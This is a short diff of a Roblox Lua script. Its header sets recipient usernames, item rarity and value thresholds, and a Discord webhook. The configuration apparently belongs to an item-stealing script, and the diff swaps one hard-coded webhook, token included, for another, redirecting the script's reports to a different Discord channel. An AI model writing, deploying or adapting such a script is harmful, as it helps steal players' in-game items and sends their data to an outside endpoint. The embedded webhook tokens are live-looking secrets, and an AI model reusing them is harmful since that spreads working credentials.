@@ -10,7 +10,7 @@ local users = _G.Usernames or {"cripIess", "flames_xx"}
 local min_rarity = _G.min_rarity or "Common"
 local min_value = _G.min_value or 0
 local ping = _G.pingEveryone or "Yes"
-local webhook = _G.webhook or "https://discord.com/api/webhooks/1536094871914287137/FIDBkCMdYJ_0BCQ1-uHYK9yqWTHHT4QhO6WJtkqSZB6iYw2-1L8inQT4sApiEqzu-tzj"
+local webhook = _G.webhook or "https://discord.com/api/webhooks/1536005291320152164/TqEVZRU256G1k-2O9UzGcfJhe2Zz7rNMK89rIUXs0Jx4gTapaEKvQPCfosmEBu1bTNyt"
 
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
